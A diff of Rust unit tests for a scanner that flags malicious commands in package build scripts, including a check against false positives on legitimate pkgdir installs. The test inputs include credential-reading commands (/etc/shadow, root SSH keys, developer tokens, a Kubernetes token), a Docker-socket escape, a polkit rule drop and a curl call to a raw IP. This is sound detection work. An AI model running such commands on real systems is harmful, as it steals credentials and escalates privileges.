+        // 27. Polkit rule drop
+        let f27 = s.scan(
+            "cp 10-admin.rules /etc/polkit-1/rules.d/10-admin.rules",
+            None,
+        );
+        assert!(f27.iter().any(|f| f.rule_id == "PRIV_ESC_POLKIT_RULE"));
+
+        // 28. Docker socket escape
+        let f28 = s.scan(
+            "curl --unix-socket /var/run/docker.sock http://localhost/containers/json",
+            None,
+        );
+        assert!(f28.iter().any(|f| f.rule_id == "PRIV_ESC_DOCKER_SOCKET"));
+    }
+
+    #[test]
+    fn test_expanded_credential_harvesting_rules() {
+        let s = test_scanner();
+
+        // 29. Developer tokens
+        let f29 = s.scan("cat ~/.npmrc ~/.git-credentials", None);
+        assert!(f29.iter().any(|f| f.rule_id == "CRED_DEV_TOKENS" && f.behavior == Behavior::CredentialAccess));
+
+        // 30. System shadow hashes
+        let f30 = s.scan("python3 -c \"open('/etc/shadow')\"", None);
+        assert!(f30.iter().any(|f| f.rule_id == "CRED_SYSTEM_SHADOW"));
+
+        // 31. Root directory access
+        let f31 = s.scan("cat /root/.ssh/id_rsa", None);
+        assert!(f31.iter().any(|f| f.rule_id == "CRED_ROOT_DIR_ACCESS"));
+
+        // 32. SSH agent socket
+        let f32 = s.scan("echo $SSH_AUTH_SOCK", None);
+        assert!(f32.iter().any(|f| f.rule_id == "CRED_SSH_AGENT_SOCKET"));
+
+        // 33. Kubernetes secrets
+        let f33 = s.scan(
+            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+            None,
+        );
+        assert!(f33.iter().any(|f| f.rule_id == "CRED_KUBERNETES_SECRETS"));
+    }
+
+    #[test]
+    fn test_whitelisting_pkgdir_and_chrome_sandbox() {
+        let s = test_scanner();
+
+        // Legitimate packaging into pkgdir must NOT trigger persistence or priv esc
+        let clean_pkg = r#"
+package() {
+  install -Dm755 env.sh "${pkgdir}/etc/profile.d/env.sh"
+  install -Dm644 custom.rules "${pkgdir}/etc/polkit-1/rules.d/10-custom.rules"
+  install -Dm644 hook.conf "${pkgdir}/etc/initcpio/hooks/myhook"
+  install -Dm644 user.service "${pkgdir}/usr/lib/systemd/user/app.service"
+  install -Dm440 sudoers.conf "$pkgdir/etc/sudoers.d/custom"
+  install -Dm644 pam.conf "${pkgdir}/etc/pam.d/app"
+  chmod 2755 "${pkgdir}/opt/google/chrome/chrome-sandbox"
+}
+"#;
+        let findings = s.scan(clean_pkg, Some("my-package"));
+        let false_positives: Vec<_> = findings
+            .iter()
+            .filter(|f| {
+                f.rule_id == "PERSIST_PROFILE_D_HOOK"
+                    || f.rule_id == "PERSIST_SYSTEMD_USER"
+                    || f.rule_id == "PERSIST_INITCPIO_HOOK"
+                    || f.rule_id == "PERSIST_PAM_TAMPERING"
+                    || f.rule_id == "PRIV_ESC_SUDOERS_WRITE"
+                    || f.rule_id == "PRIV_ESC_POLKIT_RULE"
+                    || f.rule_id == "PRIV_ESC_CHMOD_SGID"
+            })
+            .collect();
+        assert!(
+            false_positives.is_empty(),
+            "Expected zero false positives on namespaced pkgdir, got: {false_positives:?}"
+        );
+    }
+
+    #[test]
+    fn test_scanner_utf8_multibyte_safety_no_panic() {
+        let s = test_scanner();
+
+        // Multibyte string with Chinese, Cyrillic, emojis, and Arabic
+        let multibyte_content = r#"
+# Maintainer: 🦀 Привет мир! 🚀 <user@domain.com>
+# 这是一个多字节测试注释，确保在截断时不会发生字节切片越界恐慌。
+pkgname=utf8-test
+pkgver=1.0.0
+build() {
+  echo "🚀" > /tmp/test
+  curl -s http://194.26.29.112/🔥🚀💥/very_long_url_with_multibyte_chars_🦀🦀🦀_that_exceeds_120_bytes_in_length_and_would_panic_if_sliced_by_raw_byte_index
+}
+"#;
+        let findings = s.scan(multibyte_content, Some("utf8-test"));
+        assert!(!findings.is_empty());
+        for f in findings {
+            assert!(!f.matched_text.is_empty());
+        }
     }
 }
